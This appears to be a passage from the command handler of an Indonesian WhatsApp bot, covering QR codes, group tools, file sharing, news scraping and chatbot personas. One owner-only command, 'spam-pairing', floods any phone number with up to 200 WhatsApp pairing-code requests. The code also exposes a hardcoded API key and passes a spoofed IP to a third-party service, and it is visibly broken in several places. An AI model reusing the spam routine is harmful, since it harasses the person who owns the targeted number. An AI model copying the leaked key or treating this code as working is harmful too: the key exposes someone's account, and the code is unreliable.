if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (!db.users[froms].banned) return reply('Udah unbanned!')
db.users[froms].banned = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar banned`)
} else reply('tag atau reply pesan target! bloon ni anak🗿')
break

case "createqr": {
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah Harusnya ${prefix+command} Adit ganteng`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
Ditss.sendMessage(from, { image: data, caption: `Nih Qr Codenya, reply dengan pesan *.detectqr* untuk mendeteksi text yang sudah dibuat menjadi Qr` }, { quoted: qkontak })
}
break

case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (!isCreator && !isPremium) return reply('Khusus Premium (っ˘̩╭╮˘̩)')
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await Ditss.groupCreate(args.join(" "), [])
let response = await Ditss.groupInviteCode(cret.id)
let teks2 = ` [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply(teks2)
} catch {
reply("Error!")
}
}
break

case 'getbio':
if (m.quoted || q) {
let biou = (await Ditss.fetchStatus(froms).catch(err => console.log(chalk.redBright('[ ERROR ]'), chalk.whiteBright(err))) || {}).status || 'Bio di private!'
reply(biou)
} else reply('Tag atau reply pesan target!')
break

case 'setppgc': {
//if (!isRegistered) return registerbut(noregis)
if (!isCreator && !isAdmin) return onlyOwner()
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await Ditss.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await Ditss.query({
tag: 'iq',
attrs: {
to: from,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses\n\n`)
} else {
var memeg = await Ditss.updateProfilePicture(from, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses\n\n`)
}
}
break

case 'spam-pairing': {
if (!isCreator) return Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./src/media/vn/lusiapa.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })

if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
reply(`bebtar beb`)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break


case 'suma':
case 'ai':
case 'toki': {
//wm hann
 if (!text) return m.reply(`hai om/tante, apa yang bisa saya bantu hari ini?`)
async function generateVoice(Query) {
 const formData = new FormData();
 formData.append("locale", 'id-ID');
 formData.append("content", `<voice name="ja-JP-AoiNeural">${Query}</voice>`);
 formData.append("ip", '46.161.194.33');
 const response = await fetch('https://app.micmonster.com/restapi/create', {
 method: 'POST',
 body: formData
 });
 return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
};
//wm hann
const sendToGemini = async (prompt) => {
 const apiKey = 'AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ'; // Dapatkan apikey dari https://aistudio.google.com/app/apikey
 const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;
 //wm hann
 const body = {
 contents: [
 {
 parts: [
 { text: prompt }
 ]
 }
 ]
 };
//wm hann
 try {
 const response = await fetch(url, {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify(body)
 });

 const data = await response.json();

 if (response.ok) {
 return data; 
 } else {
 throw new Error(data.error.message || 'Request failed');
 }
 } catch (error) {
 console.error('Error:', error.message);
 return null;
 }
};
//wm hann
const prompt = `Nama kamu adalah asuma, kamu adalah assisten virtual yang dikembangkan langsung dari tuan dits`;
 const combinedPrompt = `${prompt} ${text}`;
//wm hann
 try {
 // Mengirim prompt ke API Gemini
 const response = await sendToGemini(combinedPrompt);
//wm hann
 if (response) {
//wm hann
 const candidates = response.candidates;
 let message = candidates && candidates.length > 0
 ? candidates[0].content.parts[0].text
 : 'Tidak ada respons yang diterima dari model.';
 //wm hann
 // Mengganti ** dengan * dan mengedit jawaban jika perlu
 messagee = message.replace(/\*\*/g, '*').replace(/#{2,}/g, '#');
 } else {
//wm hann
 Ditss.sendMessage(
 m.chat,
 { text: 'Gagal mendapatkan respons dari Gemini.' },
 { quoted: m }
 );
 }
 } catch (error) {
 console.error(error);
//wm hann
 Ditss.sendMessage(
 m.chat,
 { text: 'Terjadi kesalahan saat memproses permintaan Anda.' },
 { quoted: m }
 );
 }
//wm hann
 try {
//wm hann
 let res = await generateVoice(messagee)
await m.reply(messagee)
 if (res) await ditss.sendMessage(m.chat, {
 audio: res,
 mimetype: 'audio/mp4',
 ptt: true,
 waveform: [100, 0, 100, 0, 100, 0, 100]
 }, {
 quoted: m
 })
 } catch (e) {
 await m.reply(e)
 }
//wm hann
}
break

case 'sendsc':
case "kirimsc": {
 if (!text) return m.reply("nomor?")
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply(`proses pengiriman ke ${text}`)
var name = `AsumA`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Ditss.sendMessage(`${text}@s.whatsapp.net`, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply(`Script bot berhasil dikirim ke ${text}`)
}
break


// Export the handler
module.exports = handler;

case 'bayar_vps_paket_1':
case 'bayar_vps_paket_2':
case 'bayar_vps_paket_3':
case 'bayar_vps_paket_4':
case 'bayar_vps_paket_5':
case 'bayar_vps_paket_6':
case 'bayar1gb':
case 'bayar2gb':
case 'bayar3gb':
case 'bayar4gb':
case 'bayar5gb':
case 'bayar6gb':
case 'bayar7gb':
case 'bayar8gb':
case 'bayar9gb':
case 'bayarunli':
case 'bayar_vps':
case 'bayar_panel':
case 'bayar_nokos':
reply('Kami sedang menyampaikan ke *`owner`* untuk pesanan anda 👍\nsilahkan tunggu yaaa.')
Ditss.sendMessage(global.owner2, { image: { url : 'https://telegra.ph/file/0437dfca1c8c72d4baa5d.jpg' }, caption: `Hay *${monospa('OWNER')}* 👋\n Ada pelanggan mau *${command}* nih!!\n\nDari: *${pushname}*\nNomor: _${m.sender.split('@')[0]}_` }, { quoted: m })
break

case 'llama':
case 'ai-llama':{
let messages = [];
 try {
 
 if (!text) return m.reply(`Input textnya?`);
 let response = await fetch(`https://restapii.rioooxdzz.web.id/api/llama?message=${encodeURIComponent(text)}`);
 
 if (!response.ok) {
 throw new Error("Request to OpenAI API failed");
 }
 
 let result = await response.json();
 
 await Ditss.sendMessage(m.chat, {
 text: "" + result.data.response,
 });
 
 messages = [...messages, { role: "user", content: text }];
 } catch (error) {
 await Ditss.sendMessage(m.chat, {
 text: "" + `Error: ${error.message}`,
 });
 }
}
break

case "mausc": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `kontol`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "" 
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Ditss.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

case 'getpler': case 'getsession': {
 if (!isCreator) return reply("?")
 
 let sesi = fs.readFileSync('./database/pp.zip')
 Ditss.sendMessage(m.chat, {
 document: sesi,
 mimetype: 'application/zip',
 fileName: 'pp.zip'
 }, {
 quoted: m
 })
 }
 break

case 'ytmp4': {
 if (!text) return reply(`*Example:* ${prefix}${command} <link yt>`);
Ditss.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
 let ouh = await fetch(`https://restapii.rioooxdzz.web.id/api/ytmp4?url=${encodeURIComponent(text)}`)
 let gyh = await ouh.json() 
 let hallo = ` Judul: ${gyh.data.response.result.title}\nUrl: ${text}` 
	let url = `${gyh.data.response.result.download}`
	await Ditss.sendFile(m.chat, url, '', hallo, qevent)
}
break
case 'ai':
case 'aimusik':
case 'aixmusic':{
let isPlaying = false;
 if (isPlaying) {
 throw `Mohon tunggu, masih ada proses play yang sedang berlangsung.`;
 }
 isPlaying = true;
 try {
 if (!text) throw `Mohon berikan kata kunci untuk mencari. Contoh: ${prefix}${command} hallo world carikan saya lagu judul nya `;
 let prompt = `Kamu adalah Asuma, kamu bukanlah ai atau chat bot, kamu adalah anak remaja, kamu memiliki sifat kasar dan toxic, kadang kamu memakai emoji 🧢🖕 ketika kesal, kamu kalau ngobrol menggunakan bahasa gaul anak Indonesia seperti lu untuk kamu dan gw untuk aku.`;
 
 let memekk = await m.reply(mess.wait);
 let response = await fetch(`https://restapii.rioooxdzz.web.id/api/gptlogic?message=${text}&prompt=${prompt}`);
 let gpt = await response.json();
 await Ditss.sendMessage(m.chat, { text: `${gpt.data.response}`}, {quoted:m});
 if (text.toLowerCase().includes('lagu')) {
let search = await yts(text);
let telaso = search.all[0].url;
let ress = await fetch(`https://restapii.rioooxdzz.web.id/api/ytmp3?url=${telaso}`);
let res = await ress.json();
var puki = res.data.dl
await Ditss.sendMessage(m.chat, { react: { text: '⌛', key: m.key }})
Ditss.sendMessage(m.chat, { audio: { url: puki }, mimetype: 'audio/mpeg' }, { quoted: m}) 
 await Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
 
 } finally {
 isPlaying = false;
 }
}
break

case "couple": case"ppcp":{
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
m.reply(mess.wait)
let random = anu[Math.floor(Math.random() * anu.length)]
Ditss.sendMessage(m.chat,{image: {url: random.male,},caption: `Couple Male`,},{quoted: m,})
Ditss.sendMessage(m.chat,{image: {url: random.female,},caption: `Couple Female`,},{quoted: m,})
}
break

case 'kivotos': {
 if (!isPremium && !isCreato) return m.reply("Fitur Khusus Premium !!!")
 if (!text) return reply('Contoh: .kivotos hutao genshin impact, modern')
 await osaragi.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
 m.reply("Tunggu 30 detik...")
 try {
 await Ditss.sendMessage(m.chat, { image : { url : `https://love.neekoi.me/kivotos?text=${full_args}` }, caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${full_args}` }, { quoted: m })
 } catch (err) {
 reply(err)
 }
 await Ditss.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
 }
 break


case "cerpen":
if (!text) return m.reply('`Masukan type: .cerpen anak`')
 function cerpen(category) {
 return new Promise(async (resolve, reject) => {
 try {
 let title = category.toLowerCase().replace(/[()*]/g, "");
 let judul = title.replace(/\s/g, "-");
 let page = Math.floor(Math.random() * 5) + 1; 

 let get = await axios.get('http://cerpenmu.com/category/cerpen-' + judul + '/page/' + page);
 let $ = cheerio.load(get.data);
 let link = [];

 $('article.post').each(function (a, b) {
 link.push($(b).find('a').attr('href'));
 });

 if (link.length === 0) {
 return reject("No stories found for this category.");
 }

 let random = link[Math.floor(Math.random() * link.length)];
 let res = await axios.get(random);
 let $$ = cheerio.load(res.data);

 let hasil = {
 title: $$('#content > article > h1').text(),
 author: $$('#content > article').text().split('Cerpen Karangan: ')[1]?.split('Kategori: ')[0]?.trim(),
 kategori: $$('#content > article').text().split('Kategori: ')[1]?.split('\n')[0]?.trim(),
 lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1]?.split('\n')[0]?.trim(),
 cerita: $$('#content > article > p').text()
 };

 resolve(hasil);
 } catch (error) {
 reject(error);
 }
 });
}


 try {
 var data = await cerpen(text);
 var textpp = `Title : ${data.title}\n`;
 textpp += `Author : ${data.author}\n`;
 textpp += `Category : ${data.kategori}\n`;
 textpp += `Approved on : ${data.lolos}\n`;
 textpp += `Story :\n${data.cerita}`;

 reply(textpp);
 } catch (error) {
 console.error(error);
 m.reply("An error occurred while fetching the story.");
 }
break

case 'addpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await Ditss.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./src/media/vn/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break

case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./src/media/vn/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`../src/media/vn/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break

case 'listpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ${botname} + sbuy reply pesan target* \n\n Contoh 2 : yopdf ${botname}`
m.reply(teksoooo)
}
break

case 'yopdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
let teks = `${text}`
{
Ditss.sendMessage(m.chat, { document: fs.readFileSync(`./src/media/vn/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
Ditss.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./src/media/vn/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break

case 'addzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await Ditss.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./src/media/vn/zip/${teks}.zip`)
fs.writeFileSync('../src/media/vn/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break

case 'delzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./src/media/vn/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./src/media/vn/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break

case 'listzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ${botname} + sambil reply pesan target* \n\n Contoh 2 : yozip ${botname}`
m.reply(teksooooo)
}
break

case 'yozip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
Ditss.sendMessage(m.chat, { document: fs.readFileSync(`../src/media/vn/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
Ditss.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./src/media/vn/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break

case 'addapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await Ditss.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./src/media/vn/apk/${teks}.apk`)
fs.writeFileSync('./src/media/vn/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break

case 'delapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./src/media/vn/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./src/media/vn/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break

case 'listapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ${botname} + sambil reply pesan target* \n\n Contoh 2 : yoapk ${botname}`
m.reply(teksoooooo)
}
break

case 'yoapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
Ditss.sendMessage(m.chat, { document: fs.readFileSync(`../src/media/vn/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
Ditss.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./src/media/vn/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break

case 'addvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await Ditss.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `../src/media/vn/Audio/${text}.mp3`)
fs.writeFileSync('./src/media/vn/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break

case 'delvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./src/media/vn/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./src/media/vn/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break

case 'listvn':{
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break

case 'cnn':


CNNNews().then(res => {
no = 0
rakler = ""
for (let i of res) {
no += 1
rakler += `\n• ${no.toString()} •\n`
rakler += `Berita: ${i.berita}\n`
rakler += `Link: ${i.berita_url}\n`
}
rakler += ""
reply(rakler) 
})
break

case 'layarkaca':


if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
break
//=================================================//
case 'cnbc':


CNBCNews().then(async(res) => {
no = 0
iwannnn = ""
for (let i of res) {
no += 1
iwannnn += `\n• ${no.toString()} •\n`
iwannnn += `Berita: ${i.berita}\n`
iwannnn += `Upload: ${i.berita_diupload}\n`
iwannnn += `Link: ${i.berita_url}\n`
}
iwannnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnn }, { quoted:m })
})
break
//=================================================//
case 'tribun':


TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `Berita: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
})
break
//=================================================//
case 'indozone':


IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `Berita: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
})
break
//======================////
case "hunter": {
  if (!isRegistered) return reply('Daftar Terlebih Dahulu Untuk Bisa Menggunakan Fitur\nCara Daftar : daftar raffx|17') 	           
	                
let playerHP = 100;
let monsterHP = 100;

const attack = (attacker, defenderHP) => {
  const damage = Math.floor(Math.random() * 20) + 1;
  defenderHP -= damage;
  return { damage, defenderHP };
};

      if (monsterHP <= 0) {
      reply(`Kamu menyerang monster dengan ${result.damage} damage. Monster dikalahkan! Kirim "start" untuk bermain lagi.`);
      monsterHP = 100; // Reset monster HP untuk permainan baru
    } else {
      result = attack('monster', playerHP);
      playerHP = result.defenderHP;

      if (playerHP <= 0) {
        reply(`Monster menyerang kamu dengan ${result.damage} damage. Kamu kalah! Kirim "start" untuk mencoba lagi.`);
        playerHP = 100; // Reset player HP untuk permainan baru
      } else {
        reply(`Kamu menyerang monster dengan ${result.damage} damage. Monster HP: ${monsterHP}\nMonster menyerang kamu dengan ${result.damage} damage. Player HP: ${playerHP}`);
      }
    }
  }
  break
//=================================================//
case 'kompas':


KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `Berita: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
})
break
//=================================================//
case 'detiknews':


DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'dailynews':


DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'inews':


iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
break
//=================================================//
case 'okezone':


OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'sindo':


SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
break
//=================================================//
case 'tempo':


TempoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'antara':


AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "kontan":


KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
Ditss.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
})
